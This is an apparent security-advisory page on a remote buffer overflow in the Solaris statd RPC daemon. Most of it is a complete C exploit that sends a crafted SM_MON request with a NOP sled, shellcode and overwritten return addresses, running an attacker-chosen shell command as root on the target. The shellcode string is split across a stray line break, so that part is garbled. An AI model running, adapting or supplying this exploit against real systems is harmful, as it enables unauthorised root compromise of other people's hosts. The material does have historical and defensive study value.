source: http://www.securityfocus.com/bid/127/info

Statd is the RPC NFS status daemon. It is used to communicate status information to other services or host.

The version of statd shipped with many unix implementations contains a buffer overflow condition. This overflow condition exists in the handling of 'SM_MON' RPC requests.

Any attacker to successfully exploit this vulnerability would gain root privileges on the target host.


/*
 statd remote overflow, solaris 2.5.1 x86
 there is a patch for statd in solaris 2.5, well, it looks like
 they check only for '/' characters and they left overflow there ..
 nah, it's solaris

 usage: ./r host [cmd]  # default cmd is "touch /tmp/blahblah"
                        # remember that statd is standalone daemon

 Please do not distribute.
 */

#include <sys/types.h>
#include <sys/time.h>
#include <stdio.h>
#include <string.h>
#include <netdb.h>
#include <rpc/rpc.h>
#include <rpcsvc/sm_inter.h>
#include <sys/socket.h>

#define BUFSIZE 1024
#define ADDRS 2+1+1+4
#define ADDRP 0x8045570;

/* up to ~ 150 characters, there must be three strings */
char *cmd[3]={"/bin/sh", "-c", "touch /tmp/blahblah"};

char asmcode[]="\xeb\x3c\x5e\x31\xc0\x88\x46\xfa\x89\x46\xf5\x89\xf7\x83\xc7\x10\x89\x3e\x4f\x47\xfe\x07\x75\xfb\x47\x89\x7e\x04\x4f\x47\xfe\x07\x75\xfb\x47\x89\x7e\x08\x4f\x47\xfe\x07\x75\xfb\x89\x46\x0c\x50\x56\xff\x36\xb0\x3b\x50\x90\x9a\x01\x01\x01\x0


1\x07\x07\xe8\xbf\xff\xff\xff\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02";
char nop[]="\x90";

char code[4096];

void usage(char *s) {
  printf("Usage: %s host [cmd]\n", s);
  exit(0);
}

main(int argc, char *argv[]) {
  CLIENT *cl;
  enum clnt_stat stat;
  struct timeval tm;
  struct mon monreq;
  struct sm_stat_res monres;
  struct hostent *hp;
  struct sockaddr_in target;
  int sd, i, noplen=strlen(nop);
  char *ptr=code;

  if (argc < 2)
    usage(argv[0]);
  if (argc == 3)
    cmd[2]=argv[2];

  for (i=0; i< sizeof(code); i++)
    *ptr++=nop[i % noplen];

  strcpy(&code[750], asmcode);  /* XXX temp. */
  ptr=code+strlen(code);
  for (i=0; i<=strlen(cmd[0]); i++)
    *ptr++=cmd[0][i]-1;
  for (i=0; i<=strlen(cmd[1]); i++)
    *ptr++=cmd[1][i]-1;
  for (i=0; i<=strlen(cmd[2]); i++)
    *ptr++=cmd[2][i]-1;
  ptr=code+BUFSIZE-(ADDRS<<2);
  for (i=0; i<ADDRS; i++, ptr+=4)
    *(int *)ptr=ADDRP;
  *ptr=0;

  printf("strlen = %d\n", strlen(code));

  memset(&monreq, 0, sizeof(monreq));
  monreq.mon_id.my_id.my_name="localhost";
  monreq.mon_id.my_id.my_prog=0;
  monreq.mon_id.my_id.my_vers=0;
  monreq.mon_id.my_id.my_proc=0;
  monreq.mon_id.mon_name=code;

  if ((hp=gethostbyname(argv[1])) == NULL) {
    printf("Can't resolve %s\n", argv[1]);
    exit(0);
  }
  target.sin_family=AF_INET;
  target.sin_addr.s_addr=*(u_long *)hp->h_addr;
  target.sin_port=0;    /* ask portmap */
  sd=RPC_ANYSOCK;

  tm.tv_sec=10;
  tm.tv_usec=0;
  if ((cl=clntudp_create(&target, SM_PROG, SM_VERS, tm, &sd)) == NULL) {
    clnt_pcreateerror("clnt_create");
    exit(0);
  }
  stat=clnt_call(cl, SM_MON, xdr_mon, (char *)&monreq, xdr_sm_stat_res,
                (char *)&monres, tm);
  if (stat != RPC_SUCCESS)
    clnt_perror(cl, "clnt_call");
  else
    printf("stat_res = %d.\n", monres.res_stat);
  clnt_destroy(cl);
}